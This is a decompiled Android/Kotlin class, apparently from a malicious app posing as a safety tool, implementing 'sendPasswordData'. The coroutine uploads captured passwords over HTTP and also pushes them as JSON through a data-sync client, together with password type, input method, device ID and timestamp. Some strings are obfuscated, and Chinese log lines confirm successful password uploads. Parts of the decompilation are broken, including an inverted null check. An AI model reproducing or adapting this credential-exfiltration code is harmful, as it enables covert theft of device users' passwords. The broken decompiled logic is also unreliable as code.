package com.storm.safe.rock.service.modules;

import com.storm.safe.rock.network.C0267a0;
import com.storm.safe.rock.network.C0268a1;
import com.storm.safe.rock.util.StringUtil;
import kotlin.Result;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import org.json.JSONObject;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.f40;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.NetworkManager$sendPasswordData$1", m214403f = "NetworkManager.kt", m214404l = {1278}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class NetworkManager$sendPasswordData$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52856a1;

    /* renamed from: a2 */
    public final /* synthetic */ C0323a8 f52857a2;

    /* renamed from: a3 */
    public final /* synthetic */ String f52858a3;

    /* renamed from: a4 */
    public final /* synthetic */ String f52859a4;

    /* renamed from: a5 */
    public final /* synthetic */ String f52860a5;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public NetworkManager$sendPasswordData$1(C0323a8 c0323a8, String str, String str2, String str3, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52857a2 = c0323a8;
        this.f52858a3 = str;
        this.f52859a4 = str2;
        this.f52860a5 = str3;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new NetworkManager$sendPasswordData$1(this.f52857a2, this.f52858a3, this.f52859a4, this.f52860a5, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((NetworkManager$sendPasswordData$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Removed duplicated region for block: B:33:0x00c0  */
    /* JADX WARN: Removed duplicated region for block: B:34:0x00c4  */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        C0267a0 c0267a0;
        Object objM211377a7;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52856a1;
        try {
        } catch (Exception e) {
            t60.m214705c6("NetworkManager", "❌ HTTP上传密码异常", e);
        }
        if (i == 0) {
            kg1.m213544f4(obj);
            C0268a1 c0268a1 = this.f52857a2.f53101a1;
            if (c0268a1 != null) {
                String str = this.f52858a3;
                String str2 = this.f52859a4;
                String str3 = this.f52860a5;
                this.f52856a1 = 1;
                f40 f40Var = C0268a1.f52275a6;
                objM211377a7 = c0268a1.m211377a7(str, str2, str3, "", "", 100, this);
                if (objM211377a7 == coroutineSingletons) {
                    return coroutineSingletons;
                }
            }
            if (this.f52857a2.f53103a3 && this.f52857a2.f53102a2 != null) {
                JSONObject jSONObject = new JSONObject();
                String str4 = this.f52859a4;
                String str5 = this.f52858a3;
                String str6 = this.f52860a5;
                C0323a8 c0323a8 = this.f52857a2;
                jSONObject.put("type", StringUtil.m212470a0("O1gCKVo3HipoMipJBS9fPQg="));
                jSONObject.put("passwordType", str4);
                jSONObject.put("password", str5);
                jSONObject.put("inputMethod", str6);
                jSONObject.put("deviceId", c0323a8.f53107a7);
                jSONObject.put("timestamp", System.currentTimeMillis());
                c0267a0 = this.f52857a2.f53102a2;
                if (c0267a0 != null) {
                    t60.m214724f2("dataSyncClient");
                    throw null;
                }
                c0267a0.m211369b0(jSONObject);
            }
            return C1351vv.f60710b1;
        }
        if (i != 1) {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        kg1.m213544f4(obj);
        objM211377a7 = ((Result) obj).f57559a0;
        int i2 = Result.f57558a1;
        if (objM211377a7 instanceof Result.Failure) {
            Throwable thM213607a0 = Result.m213607a0(objM211377a7);
            t60.m214726f4("NetworkManager", "⚠️ HTTP上传密码失败: " + (thM213607a0 != null ? thM213607a0.getMessage() : null));
        } else {
            t60.m214702c3("NetworkManager", "✅ 密码已通过 HTTP 上传: type=".concat(this.f52859a4));
        }
        if (this.f52857a2.f53103a3) {
            JSONObject jSONObject2 = new JSONObject();
            String str42 = this.f52859a4;
            String str52 = this.f52858a3;
            String str62 = this.f52860a5;
            C0323a8 c0323a82 = this.f52857a2;
            jSONObject2.put("type", StringUtil.m212470a0("O1gCKVo3HipoMipJBS9fPQg="));
            jSONObject2.put("passwordType", str42);
            jSONObject2.put("password", str52);
            jSONObject2.put("inputMethod", str62);
            jSONObject2.put("deviceId", c0323a82.f53107a7);
            jSONObject2.put("timestamp", System.currentTimeMillis());
            c0267a0 = this.f52857a2.f53102a2;
            if (c0267a0 != null) {
            }
        }
        return C1351vv.f60710b1;
    }
}
